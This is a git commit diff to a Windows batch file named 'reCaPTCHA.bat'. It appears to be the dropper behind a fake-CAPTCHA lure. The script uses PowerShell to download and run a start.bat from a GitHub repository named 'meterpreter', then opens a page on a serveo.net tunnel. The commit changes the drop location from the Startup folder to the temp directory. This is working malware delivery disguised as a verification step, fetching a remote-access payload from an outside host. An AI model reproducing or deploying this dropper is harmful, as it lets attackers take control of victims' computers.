fd23f1a3e11744cc7bd07366fa080c318c25aa05
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-09-21 20:36:08 +0300

    Update reCaPTCHA.bat

--- reCaPTCHA.bat
+++ reCaPTCHA.bat
@@ -1,11 +1,12 @@
 @echo off
-set startupPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+set tempPath=%temp%
 
-if not exist "%startupPath%" (
-    echo Startup path not found: %startupPath%
+if not exist "%tempPath%" (
+    echo temp path not found
 ) else (
-    cd /d "%startupPath%"
+    cd /d "%tempPath%"
     powershell -Command ^
         "try { (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/0x2034/meterpreter/main/start.bat', 'start.bat'); Start-Process 'start.bat' } catch { Write-Output 'Failed to download or start the file. Error: ' + $_ }"
 )
+
 start https://fbed484c6ea22e0467671566e490de70.serveo.net/reCaPTCHA/r.html
